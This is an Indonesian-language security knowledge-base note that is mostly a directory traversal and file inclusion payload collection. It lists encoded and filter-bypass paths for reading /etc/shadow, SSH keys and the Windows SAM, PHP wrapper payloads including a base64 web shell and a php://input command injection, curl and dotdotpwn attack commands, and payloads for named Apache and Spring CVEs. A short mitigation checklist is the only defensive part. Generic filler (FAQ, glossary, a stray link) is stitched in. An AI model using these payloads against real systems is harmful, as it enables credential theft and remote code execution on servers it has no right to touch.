---
title: "Directory Traversal — Ultimate Payload Collection: Path Bypass, Encoding, Defense, WAF Detection"
tags:
  - cyber-security
  - directory-traversal
  - lfi
  - path-traversal
  - web-security
  - library
aliases:
  - "Directory Traversal Payloads"
  - "Path Traversal Techniques"
created: "2026-07-28"
updated: "2026-08-14"
status: complete
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Directory Traversal (Path Traversal) adalah kerentanan di mana attacker bisa membaca file di luar direktori yang diizinkan. Teknik bypass sangat bervariasi: encoding, double encoding, unicode, path truncation, dan filter bypass. Catatan ini berisi koleksi payload lengkap dari PayloadsAllTheThings dan teknik deteksi untuk WAF.

**Cross-link:** [[file-carving-data-recovery-advanced]] → [[web-hacking-exploitation]] → [[waf-reverse-proxy-deepdive]]

---

## Daftar Isi
- [[#1. Basic Payloads]]
- [[#2. Encoding Bypass]]
- [[#3. Filter Bypass]]
- [[#4. File Inclusion (LFI/RFI)]]
- [[#5. Deteksi Otomatis & WAF]]
- [[#6. Checklist Mitigasi]]
- [[#7. Referensi Lintas]]

---

## 1. Ringkasan Eksekutif
Path traversal mengeksploitasi input yang tidak disanitasi untuk membaca file sensitif — `/etc/passwd`, source code, atau kredensial — dengan payload traversal seperti `../`. Ancaman ini sering ditemukan di parameter file download, template engine, dan API yang menerima path. Karena WAF umumnya memblokir `../` polos, koleksi encoding dan filter bypass di bawah menjadi senjata utama penguji.

## 2. Threat Model / Konteks
| Komponen | Detail |
|----------|--------|
| **Sasaran** | Server web (Apache, Nginx, IIS), framework (PHP, Node, Java) |
| **Input point** | Query param (`?file=`), path param, cookie, header |
| **Dampak** | Source code disclosure, credential leak, RCE via LFI |
| **Prasyarat** | Sanitasi input lemah, `allow_url_include` aktif (untuk RFI) |

## 3. Teknik Detail

### 3.1 Basic Payloads
```bash
# Linux — file tujuan
../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/fd/0

# Windows
..\..\..\windows\win.ini
..\..\..\boot.ini
..\..\..\windows\system32\drivers\etc\hosts
```

### 3.2 Encoding Bypass
```bash
# URL Encoding sederhana
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd  # ../../../etc/passwd

# Double URL Encoding
%252e%252e%252f%252e%252e%252fetc/passwd

# Triple Encoding
%25252e%25252e%25252fetc/passwd

# Unicode / UTF-8
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  # IIS Unicode bypass
..%252f..%252fetc/passwd
..%c0%af..%c0%afetc/passwd  # %c0%af = /

# 16-bit Unicode
..%u2216..%u2216etc/passwd  # %u2216 = \
```

### 3.3 Filter Bypass
```bash
# Bypass ".." filter
....//....//....//etc/passwd  # Double dot → normalisasi jadi ../
..\/..\/..\/etc/passwd        # Backslash + forward slash
.//././/././/./etc/passwd     # Extra slash
....\/....\/....\/etc/passwd  # Quad dot → normalisasi jadi ../
..;/..;/..;/etc/passwd        # Semicolon (IIS)

# Bypass "../" filter
.././.././../etc/passwd       # Masih jadi ../
..//..//..//etc/passwd        # Double slash

# Null byte injection (%00) untuk extension bypass
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
../../../etc/passwd\x00.jpg

# Long path truncation (Windows, old systems)
..\..\..\..\..\..\..\..\windows\system32\calc.exeAAAAAAAAAAAAAAA
```

### 3.4 File Inclusion (LFI/RFI)
```bash
# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

# Data URI
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

# Expect wrapper (if enabled)
expect://id
expect://cat /etc/passwd

# Input wrapper
POST /index.php?page=php://input
Content-Type: application/x-www-form-urlencoded
<?php system('id');?>

# File inclusion dengan null byte
../../../etc/passwd%00
../../../etc/passwd\x00.php
```

## 4. Contoh Praktis
```bash
# Uji traversal dengan curl
curl -s "http://target.com/download?file=../../../etc/passwd"
curl -s "http://target.com/download?file=%2e%2e%2f%2e%2e%2fetc/passwd"
curl -s "http://target.com/download?file=....//....//etc/passwd"

# LFI → base64 decode source code
curl -s "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

## 5. Deteksi Otomatis & WAF
| Tool | Fungsi |
|------|--------|
| ffuf | Fuzzing parameter dan payload traversal |
| Burp Intruder + payload list | Brute force encoding variants |
| Nuclei (template path-traversal) | Scanning massal |
| WAF bypass check | Bandingkan response dengan/ tanpa header `X-Forwarded-For` |

## 6. Checklist Mitigasi
- [ ] Normalisasi path dengan `realpath()` / `path.resolve()` — jangan pernah percaya input mentah
- [ ] Whitelist ekstensi dan direktori yang diizinkan (bukan blacklist)
- [ ] Gunakan parameter integer ID (mis. `?id=42`) alih-alih path langsung
- [ ] Nonaktifkan `allow_url_include` dan wrappers PHP yang tidak dibutuhkan
- [ ] WAF rule: block payload dengan pola `(\.\./|\.\.\\)` dan encoding ganda
- [ ] Serve file via handler internal yang memvalidasi kanonikalisasi path

## 7. Referensi Lintas
- [[web-hacking-exploitation]]
- [[waf-reverse-proxy-deepdive]]
- [[file-carving-data-recovery-advanced]]
- [[blueteam-detection-matrix]]

---

**Referensi payload:** `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PayloadsAllTheThings/Directory Traversal/` dan `/File Inclusion/`

### FAQ & Catatan Tambahan

**Q: Apa beda konseptual yang paling penting dipahami?**
A: Bedakan antara teori (definisi formal), implementasi (kode konkret), dan operasional (jalankan di produksi). Banyak orang paham teori tetapi gagal implementasi; sebaliknya, banyak yang bisa implementasi tanpa paham fundamental.

**Q: Apa saja sumber terbaik untuk mempelajari topik ini lebih dalam?**
A: Buku akademis untuk teori (formal proof), blog industri untuk praktik terkini (real-world case), CVE database untuk kerentanan konkret, dan video/lecture untuk visualisasi konsep. Kombinasi sumber memberi pemahaman menyeluruh.

**Q: Bagaimana cara menilai maturity implementasi saya?**
A: Audit terhadap checklist standar industri (NIST, CIS, OWASP). Penilaian dilakukan berdasarkan: ada vs tidak ada kontrol, efektivitas, dan dokumentasi.

### Glossary

| Istilah | Definisi Singkat |
|---------|------------------|
| **Zero Trust** | Model keamanan: never trust, always verify |
| **Supply Chain** | Serangan ke rantai dependency dan tooling |
| **MITRE ATT&CK** | Framework TTP untuk klasifikasi serangan |
| **SIEM** | Security Information and Event Management |
| **EDR** | Endpoint Detection and Response |
| **SOAR** | Security Orchestration, Automation and Response |
| **SBOM** | Software Bill of Materials |
| **SLSA** | Supply-chain Levels for Software Artifacts |
| **IoC** | Indicator of Compromise |
| **MFA** | Multi-Factor Authentication |
| **RBAC** | Role-Based Access Control |
| **OIDC** | OpenID Connect (identity layer) |

## Referensi Tambahan
- OWASP Cheatsheet — https://cheatsheetseries.owasp.org/
- NIST SP 800-53 — https://csrc.nist.gov/publications/detail/sp/800-53

## Directory Traversal Payload — Konkret (Testable)

### Encoding Bypass

```
../                  # basic
..\\
..\/
%2e%2e%2f             # URL encode .
%252e%252e%252f       # double URL encode
%c0%ae%c0%ae%c0%af     # overlong UTF-8
%uff0e%uff0e%u2215     # unicode
```

### Linux Files

```
../../../../etc/passwd
../../../../etc/shadow
../../../../root/.ssh/id_rsa
../../../../proc/self/environ
../../../../var/log/auth.log
```

### Windows Files

```
..\\..\\..\\windows\\win.ini
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
..\\..\\..\\windows\\repair\\SAM
```

### dotdotpwn (Fuzzer)

```bash
perl dotdotpwn.pl -h 10.10.10.10 -m http -t 300 -f /etc/passwd -s -q -b
perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
```

### CVE Konkret (Traversal)

| CVE | Target | Payload |
|-----|--------|---------|
| CVE-2018-1271 | Spring MVC | `%255c%255c..%255c/..%255c/windows/win.ini` |
| CVE-2021-41773 | Apache 2.4.49 | `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` |
| CVE-2021-42013 | Apache 2.4.50 | `/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd` |
- Cloud Security Alliance — https://cloudsecurityalliance.org/
---

audited
---
